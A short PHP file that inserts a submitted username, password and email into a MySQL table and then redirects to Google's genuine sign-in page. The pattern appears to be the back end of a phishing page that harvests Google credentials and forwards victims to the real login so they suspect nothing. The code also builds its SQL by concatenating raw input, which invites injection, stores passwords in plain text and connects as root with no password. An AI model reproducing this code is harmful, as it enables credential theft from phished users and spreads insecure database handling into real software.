<?php


// Create connection



function insertRegister($data = []) {


if($data){

    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "test1";
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}
$sql = "INSERT INTO users (username, password, email)
VALUES ('".$data['username']."','".$data['password']."', '".$data['email']."')";

if ($conn->query($sql) === TRUE) {
  echo "New record created successfully";
  //http_redirect("db/blue/");//
  header("Location: https://accounts.google.com/signin/v2/identifier?passive=1209600&continue=https%3A%2F%2Faccounts.google.com%2Fb%2F0%2FAddMailService&followup=https%3A%2F%2Faccounts.google.com%2Fb%2F0%2FAddMailService&flowName=GlifWebSignIn&flowEntry=ServiceLogin");
} else {
  echo "Error: " . $sql . "<br>" . $conn->error;
}

}
}
//echo $data['name'];
// if($data){
//     echo $data['name'];
// }

//}
//$conn->close();
?>